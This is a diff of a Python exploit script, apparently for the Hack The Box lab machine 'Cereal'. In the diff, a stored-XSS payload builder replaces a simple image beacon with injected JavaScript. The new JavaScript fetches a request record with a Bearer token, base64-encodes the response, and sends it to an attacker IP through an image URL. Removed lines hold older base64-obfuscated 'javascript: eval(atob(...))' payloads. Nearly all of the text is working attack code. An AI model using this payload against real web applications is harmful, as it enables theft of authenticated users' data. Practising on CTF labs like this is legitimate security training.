@@ -54,14 +54,7 @@ def xss_cereal(ip, base_url, base_headers, token, target_id):
     
     print("\n=== POSTING XSS CEREAL ===\n")
     
-    #js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
-    
-    #comparing old payloads
-    #{"JSON":"{\"title\":\"[XSS](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjMyL2ltZyI7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs=%22%29%29)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
-    #{"JSON":"{\"title\":\"[XSS](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjE3MC9pbWciO2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImRpdltjbGFzc05hbWU9J2NhcmQgY2FyZC1ib2R5IGJnLWxpZ2h0J10iKS5hcHBlbmRDaGlsZChpbWFnZSk7str%22%29%29)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
-
-    
-    js_string = 'const image = document.createElement("img");image.src = "http://{ip}/img";document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(ip=ip)
+    js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.responseText);console.log(resp);const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
     
     print("Javascript to be injected: " + js_string + "\n")
     
